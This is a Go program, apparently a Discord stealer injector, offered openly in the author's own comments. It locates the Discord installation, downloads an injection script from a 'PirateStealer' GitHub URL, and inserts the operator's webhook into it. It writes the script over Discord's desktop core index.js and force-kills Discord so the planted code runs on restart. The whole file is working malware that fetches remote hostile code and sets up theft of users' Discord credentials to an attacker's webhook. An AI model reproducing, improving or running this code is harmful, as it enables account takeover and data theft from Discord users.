package main
//btw english not first language so it wont be rlly good to understand i write unclean code so i ask sometimes for someone to rewrite so it can represent good
import (
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
)

const webhookURL = "Webhook " //Replace the Webhook with yours nothing complicated
const injectionScriptURL = "https://raw.githubusercontent.com/6R-r/PirateStealer/main/src/injection/injection-clean.js" //Bby stealer, aka pirate steakler

func injectDiscord() bool {
	localAppData := os.Getenv("LOCALAPPDATA") //get sin localappdata, searches for discord and after does regex thing  after it injects the desktop core and shutdowns 
	directories, err := ioutil.ReadDir(localAppData)
	if err != nil {
		return false
	}
	for _, dir := range directories {
		if strings.Contains(strings.ToLower(dir.Name()), "discord") { //gets the dir after it needs the app-998899889 blah blah, we use regex for that
			subdirectories, err := ioutil.ReadDir(filepath.Join(localAppData, dir.Name()))
			if err != nil {
				return false
			}

			for _, subdir := range subdirectories {
				if matched, _ := regexp.MatchString("app-(\\d*\\.\\d*)*", subdir.Name()); matched { //thisj ust gets the dir
					directoryPath := filepath.Join(localAppData, dir.Name(), subdir.Name())
					response, err := http.Get(injectionScriptURL)
					if err != nil {
						return false
					}
					defer response.Body.Close()
					data, err := ioutil.ReadAll(response.Body)
					if err != nil {
						return false
					}

					injectionScript := strings.Replace(string(data), "%WEBHOOK_LINK%", webhookURL, -1) //this replaces the webhook in the injection example: i run and based of the webhook i gave in the go it will replace in the injection
					indexFilePath := filepath.Join(directoryPath, "modules", "discord_desktop_core-1", "discord_desktop_core", "index.js") //path to inject
					err = ioutil.WriteFile(indexFilePath, []byte(injectionScript), 0644)
					if err != nil {
						return false
					}
					return true
				}
			}
		}
	}
	return false
}

func killDiscord() {
	cmd := exec.Command("tasklist")
	output, _ := cmd.Output()
	processes := string(output)
	if strings.Contains(processes, "Discord.exe") {
		_ = exec.Command("taskkill", "/IM", "Discord.exe", "/F").Run() // shutdowns disc 
	}
}

func main() {
	injectionSuccessful := injectDiscord()
	if injectionSuccessful { //if its successfully injected then it will shutdown discord
		killDiscord()
	}
}
